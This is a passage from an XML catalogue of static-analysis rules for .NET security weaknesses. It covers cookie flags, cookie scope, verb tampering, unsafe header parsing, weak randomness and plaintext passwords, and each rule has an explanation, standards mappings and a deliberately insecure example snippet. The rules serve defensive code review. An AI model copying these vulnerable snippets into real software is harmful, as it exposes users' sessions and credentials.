																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 639</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authorization</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 863</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.2</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>security-features</tag>
  </rule>
  <rule>
    <key>security_features_cookie_security_cookie_not_sent_over_ssl</key>
    <internalKey>Security Features/Cookie Security/Cookie not Sent Over SSL</internalKey>
    <name>Cookie Security: Cookie not Sent Over SSL</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A cookie is created without the <code>secure</code> flag set to <code>true</code>.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Modern web browsers support a <code>secure</code> flag for each cookie.  If the flag is set, the browser will only send the cookie over HTTPS. Sending cookies over an unencrypted channel can expose them to network sniffing attacks, so the secure flag helps keep a cookie's value confidential. This is especially important if the cookie contains private data or carries a session identifier.<br><br><br><br><b>Example:</b> In the example below, a cookie added to the response without setting the <code>Secure</code> property.<br><pre><br>...<br> HttpCookie cookie = new HttpCookie("emailCookie", email);<br>    Response.AppendCookie(cookie);<br>...<br></pre><br><br>If your application uses both HTTPS and HTTP but does not set the <code>secure</code> flag, cookies set during an HTTPS request will also be sent during subsequent HTTP requests. Sniffing network traffic over unencrypted wireless connections is a trivial task for attackers, so sending cookies (especially those with session IDs) over HTTP can result in application compromise.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[10] Mike Perry <em>Automated HTTPS Cookie Hijacking</em> <br></p>
																									   <p>[11] Standards Mapping - FIPS200 - (FISMA) <em>CM, SC</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 614</em> <br></p>
																									   <p>[13]  <em>HttpCookie Class</em> Microsoft<br></p>
																									   <p>[14] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[15] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M4 Unintended Data Leakage</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[20] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>security-features</tag>
  </rule>
  <rule>
    <key>security_features_cookie_security_httponly_not_set</key>
    <internalKey>Security Features/Cookie Security/HTTPOnly not Set</internalKey>
    <name>Cookie Security: HTTPOnly not Set</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program creates a cookie, but fails to set the <code>HttpOnly</code> flag to <code>true</code>.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Microsoft Internet Explorer supports the <code>HttpOnly</code> cookie property that prevents client-side scripts from accessing the cookie. Cross-site scripting attacks often access cookies in an attempt to steal session identifiers or authentication tokens. When <code>HttpOnly</code> is not enabled, attackers can more easily access user cookies.<br>  <br><br><b>Example 1:</b> The code in the example below creates a cookie without setting the <code>HttpOnly</code> property.<br><pre><br>    HttpCookie cookie = new HttpCookie("emailCookie", email);<br>    Response.AppendCookie(cookie);<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[4] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[5]  <em>HttpCookie.HttpOnly Property</em> Microsoft<br></p>
																									   <p>[6] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M4 Unintended Data Leakage</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[9] Amit Klein <em>Round-up: Ways to bypass HttpOnly (and HTTP Basic auth)</em> <br></p>
																									   <p>[10] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>security-features</tag>
  </rule>
  <rule>
    <key>security_features_cookie_security_overly_broad_domain</key>
    <internalKey>Security Features/Cookie Security/Overly Broad Domain</internalKey>
    <name>Cookie Security: Overly Broad Domain</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A cookie with an overly broad domain opens an application to attacks through other applications.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Developers often set cookies to be active across a base domain like "<code>.example.com</code>". This exposes the cookie to all web applications on the base domain and any sub-domains. Since cookies often carry sensitive information such as session identifiers, sharing cookies across applications can lead a vulnerability in one application to cause a compromise in another.<br><br><b>Example:</b><br>Imagine you have a secure application deployed at <code>http://secure.example.com/</code>, and the application sets a session ID cookie with domain "<code>.example.com</code>" when a user logs in.<br><br>For example:<br><pre><br>  HttpCookie cookie = new HttpCookie("sessionID", sessionID);<br>  cookie.Domain = ".example.com";<br></pre><br><br>Suppose you have another, less secure, application at <code>http://insecure.example.com/</code> and it contains a cross-site scripting vulnerability. Any user authenticated to <code>http://secure.example.com</code> that browses to <code>http://insecure.example.com</code> risks exposing their session cookie from <code>http://secure.example.com</code>.<br><br>In addition to reading a cookie, it might be possible for attackers to perform a Cookie Poisoning attack by using <code>insecure.example.com</code> to create its own overly broad cookie that overwrites the cookie from <code>secure.example.com</code>.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-4 Information Flow Enforcement (P1)</em> <br></p>
																									   <p>[6] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[7] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M4 Unintended Data Leakage</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>security-features</tag>
  </rule>
  <rule>
    <key>security_features_cookie_security_overly_broad_path</key>
    <internalKey>Security Features/Cookie Security/Overly Broad Path</internalKey>
    <name>Cookie Security: Overly Broad Path</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A cookie with an overly broad path can be accessed through other applications on the same domain.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Developers often set cookies to be the root context path "<code>/</code>", however, doing so exposes the cookie to all web applications on the same domain name. Since cookies often carry sensitive information such as session identifiers, sharing cookies across applications can lead a vulnerability in one application to cause a compromise in another.<br><br><b>Example:</b><br>Imagine you have a forum application deployed at <code>http://communitypages.example.com/MyForum</code> and the application sets a session ID cookie with path "<code>/</code>" when users log in to the forum.<br><br>For example:<br><pre><br>  HttpCookie cookie = new HttpCookie("sessionID", sessionID);<br>  cookie.Path = "/";<br></pre><br><br>Suppose an attacker creates another application at <code>http://communitypages.example.com/EvilSite</code> and posts a link to this site on the forum. When a user of the forum clicks on the link, his browser will send the cookie set by <code>/MyForum</code> to the application running at <code>/EvilSite</code>. By stealing the session ID, the attacker is able to compromise the account of any forum user that browsed to <code>/EvilSite</code>.<br><br>In addition to reading a cookie, it might be possible for attackers to perform a Cookie Poisoning attack by using <code>/EvilSite</code> to create its own overly broad cookie that overwrites the cookie from <code>/MyForum</code>.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-4 Information Flow Enforcement (P1)</em> <br></p>
																									   <p>[6] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[7] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M4 Unintended Data Leakage</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>security-features</tag>
  </rule>
  <rule>
    <key>security_features_cookie_security_persistent_cookie</key>
    <internalKey>Security Features/Cookie Security/Persistent Cookie</internalKey>
    <name>Cookie Security: Persistent Cookie</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Storing sensitive data in a persistent cookie can lead to a breach of confidentiality or account compromise.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Most Web programming environments default to creating non-persistent cookies.  These cookies reside only in browser memory (they are not written to disk) and are lost when the browser is closed.  Programmers can specify that cookies be persisted across browser sessions until some future date.  Such cookies are written to disk and survive across browser sessions and computer restarts.<br><br>If private information is stored in persistent cookies, attackers have a larger time window in which to steal this data - especially since persistent cookies are often set to expire in the distant future.  Persistent cookies are often used to profile users as they interact with a site. Depending on what is done with this tracking data, it is possible to use persistent cookies to violate users' privacy.<br><br><br><b>Example:</b> The following code sets a cookie to expire in 10 years.<br><pre><br>    HttpCookie cookie = new HttpCookie("emailCookie", email);<br>    cookie.Expires = DateTime.Now.AddYears(10);;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3210.1 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3210.1 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3210.1 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3210.1 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3210.1 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 539</em> <br></p>
																									   <p>[11]  <em>HttpCookie.Expires Property</em> Microsoft<br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M9 Improper Session Handling</em> <br></p>
																									   <p>[14] Standards Mapping - FIPS200 - (FISMA) <em>MP</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 3.4, Requirement 6.3.1.3, Requirement 6.5.8</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 3.4, Requirement 6.5.3</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 3.4, Requirement 6.5.3</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 3.4, Requirement 6.5.8</em> <br></p>
																									   <p>[19] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-23 Session Authenticity (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>security-features</tag>
  </rule>
  <rule>
    <key>security_features_http_verb_tampering</key>
    <internalKey>Security Features/HTTP Verb Tampering</internalKey>
    <name>HTTP Verb Tampering</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Security constraints that specify HTTP verbs often allow more access than intended.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  An application's authentication and authorization mechanisms can be bypassed with HTTP verb tampering when:<br>1) It uses a security control that lists HTTP verbs.<br>2) The security control fails to block verbs that are not listed.<br>3) The application updates its state based on GET requests or other arbitrary HTTP verbs.<br><br><br><br>The following configuration is vulnerable to HTTP Verb Tampering:<br><pre><br>    &lt;authorization&gt;<br>        &lt;allow verbs="GET,POST" users="admin"/&gt;<br>        &lt;deny verbs="GET,POST"users="*" /&gt;<br>    &lt;/authorization&gt;<br></pre><br>By default, the .NET framework allows all HTTP verbs, so even though this configuration denies GETs and POSTs to all users, it does not prevent HEAD requests. It might be possible for an attacker to exercise administrative functionality by substituting GET or POST requests with HEAD requests. In other words, this code satisfies conditions 1 and 2 above. All that remains for HEAD requests to exercise administrative functionality is for the application to carry out commands based on requests that use verbs other than POST.<br><br>At its core, this vulnerability is the result of an attempt to create a blacklist--a policy that specifies what users are not allowed to do. Blacklists rarely achieve their intended effect.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[5] Arshan Dabirsiaghi - Aspect Security <em>Bypassing Web Authentication and Authorization with HTTP Verb Tampering</em> <br></p>
																									   <p>[6] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 288</em> <br></p>
																									   <p>[8] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.10</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>security-features</tag>
  </rule>
  <rule>
    <key>security_features_header_checking_disabled</key>
    <internalKey>Security Features/Header Checking Disabled</internalKey>
    <name>Header Checking Disabled</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The application sets a property that causes validation errors that occur during HTTP parsing to be ignored.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Setting <code>useUnsafeHeaderParsing</code> to <code>true</code> relaxes processing of HTTP headers. Overly permissive validation rules on HTTP headers can permit a variety of attacks against vulnerable applications.<br><br><br><br>Specifically, when this property is set to false, the following validation rules are no longer enforced:<br><br>    In end-of-line code, use CRLF; using CR or LF alone is not allowed.<br><br>    Headers names should not have spaces in them.<br><br>    If multiple status lines exist, all additional status lines are treated as malformed header name/value pairs.<br><br>    The status line must have a status description, in addition to a status code.<br><br>    Header names cannot have non-ASCII characters in them. This validation is performed whether this property is set to true or false.<br><br>When a protocol violation occurs, a WebException exception is thrown with the status set to ServerProtocolViolation. If the UseUnsafeHeaderParsing property is set to true, validation errors are ignored.<br><br>Setting this property to true has security implications, so it should only be done if backward compatibility with a server is required.<br><br><br><br><b>Example 1:</b> In the example below, <code>useUnsafeHeaderParsing</code> is set to true.<br><pre><br>...<br>&lt;configuration&gt;<br>   &lt;system.net&gt;<br>   &lt;settings&gt;<br>      &lt;httpWebRequest  useUnsafeHeaderParsing="true" /&gt;<br>   &lt;/settings&gt;<br>   &lt;/system.net&gt;<br>&lt;/configuration&gt;<br>...<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 113</em> <br></p>
																									   <p>[11]  <em>HttpWebRequestElement.UseUnsafeHeaderParsing Property</em> Microsoft<br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[17] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>security-features</tag>
  </rule>
  <rule>
    <key>security_features_insecure_randomness</key>
    <internalKey>Security Features/Insecure Randomness</internalKey>
    <name>Insecure Randomness</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Standard pseudo-random number generators cannot withstand cryptographic attacks.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Insecure randomness errors occur when a function that can produce predictable values is used as a source of randomness in security-sensitive context.<br><br>Computers are deterministic machines, and as such are unable to produce true randomness. Pseudo-Random Number Generators (PRNGs) approximate randomness algorithmically, starting with a seed from which subsequent values are calculated.<br><br>There are two types of PRNGs: statistical and cryptographic. Statistical PRNGs provide useful statistical properties, but their output is highly predictable and forms an easy to reproduce numeric stream that is unsuitable for use in cases where security depends on generated values being unpredictable. Cryptographic PRNGs address this problem by generating output that is more difficult to predict. For a value to be cryptographically secure, it must be impossible or highly improbable for an attacker to distinguish between it and a truly random value. In general, if a PRNG algorithm is not advertised as being cryptographically secure, then it is probably a statistical PRNG and should not be used in security-sensitive contexts, where its use can lead to serious vulnerabilities such as easy-to-guess temporary passwords, predictable cryptographic keys, session hijacking, and DNS spoofing.<br><br><b>Example:</b> The following code uses a statistical PRNG to create a URL for a receipt that remains active for some period of time after a purchase.<br><br><pre><br>string GenerateReceiptURL(string baseUrl) {<br>    Random Gen = new Random();<br>    return (baseUrl + Gen.Next().toString() + &quot;.html&quot;);<br>}<br></pre><br><br>This code uses the <code>Random.Next()</code> function to generate "unique" identifiers for the receipt pages it generates. Because <code>Random.Next()</code> is a statistical PRNG, it is easy for an attacker to guess the strings it generates. Although the underlying design of the receipt system is also faulty, it would be more secure if it used a random number generator that did not produce predictable receipt identifiers, such as a cryptographic PRNG.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3150.2 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3150.2 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3150.2 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3150.2 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3150.2 CAT II</em> <br></p>
																									   <p>[9] J. Viega, G. McGraw <em>Building Secure Software</em> Addison-Wesley<br></p>
																									   <p>[10]  <em>Cryptography Reference</em> Microsoft<br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 330</em> <br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M6 Broken Cryptography</em> <br></p>
																									   <p>[14] Standards Mapping - FIPS200 - (FISMA) <em>MP</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Porous Defenses - CWE ID 330</em> <br></p>
																									   <p>[16]  <em>RandomNumberGenerator Class Documentation</em> Microsoft<br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.3, Requirement 6.5.8</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.3</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.3</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[21] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-13 Cryptographic Protection (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>security-features</tag>
  </rule>
  <rule>
    <key>security_features_password_management</key>
    <internalKey>Security Features/Password Management</internalKey>
    <name>Password Management</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Storing a password in plaintext could result in a system compromise.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Password management issues occur when a password is stored in plaintext in an application's configuration files or other data store.<br><br><b>Example:</b> The following code reads a password from the registry and uses the password to create a new network credential.<br><br><pre><br>...<br>string password = regKey.GetValue(passKey).ToString());<br>NetworkCredential netCred =<br>           new NetworkCredential(username,password,domain);<br>...<br></pre><br><br>This code will run successfully, but anyone who has access to the registry key used to store the password can read the value of <code>password</code>. If a devious employee has access to this information, they can use it to break into the system.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
